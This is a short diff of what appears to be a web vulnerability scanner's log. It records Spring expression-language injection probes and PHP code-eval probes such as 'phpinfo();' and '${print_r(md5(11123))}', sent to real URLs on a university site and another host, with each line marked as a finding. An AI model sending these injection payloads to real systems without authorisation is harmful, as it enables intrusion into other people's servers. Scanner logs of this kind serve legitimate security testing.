@@ -1,4 +1,6 @@
-2017-02-09 22:18:07,687 INFO http://www.software.fudan.edu.cn/people/peopledetail.shtml?letasdter=${new+java.lang.String(new+byte[]{97,114,55,116,116,116,97,111,117,105})}&peopleTyspeId=1&people.id=57 => Sprint Boot EL
-2017-02-09 22:18:07,687 INFO http://www.software.fudan.edu.cn/people/peopledetail.shtml?letasdter=a&peopleTyspeId=${new+java.lang.String(new+byte[]{97,114,55,116,116,116,97,111,117,105})}&people.id=57 => Sprint Boot EL
-2017-02-09 22:18:07,687 INFO http://www.software.fudan.edu.cn/people/peopledetail.shtml?letasdter=${119841162-2}&peopleTyspeId=1&people.id=57 => Sprint Boot EL
-2017-02-09 22:18:07,688 INFO http://www.software.fudan.edu.cn/people/peopledetail.shtml?letasdter=a&peopleTyspeId=${119841162-2}&people.id=57 => Sprint Boot EL
+2017-02-11 22:05:04,570 INFO http://www.software.fudan.edu.cn/people/peopledetail.shtml?peaaaopleTypeId=${new+java.lang.String(new+byte[]{106,51,49,53,108,118,120,105,120,106})}&letter=a&people.id=57 => Sprint Boot EL
+2017-02-11 22:05:04,570 INFO http://www.software.fudan.edu.cn/people/peopledetail.shtml?peaaaopleTypeId=3&letter=${new+java.lang.String(new+byte[]{106,51,49,53,108,118,120,105,120,106})}&people.id=57 => Sprint Boot EL
+2017-02-11 22:05:04,570 INFO http://www.software.fudan.edu.cn/people/peopledetail.shtml?peaaaopleTypeId=${119841162-2}&letter=a&people.id=57 => Sprint Boot EL
+2017-02-11 22:05:04,571 INFO http://www.software.fudan.edu.cn/people/peopledetail.shtml?peaaaopleTypeId=3&letter=${119841162-2}&people.id=57 => Sprint Boot EL
+2017-02-11 22:05:06,456 INFO http://daza.im:81/vul_eval.php?s=phpinfo(); => PHP Code eval
+2017-02-11 22:05:06,456 INFO http://daza.im:81/vul_eval.php?s=${print_r(md5(11123))}; => PHP Code eval
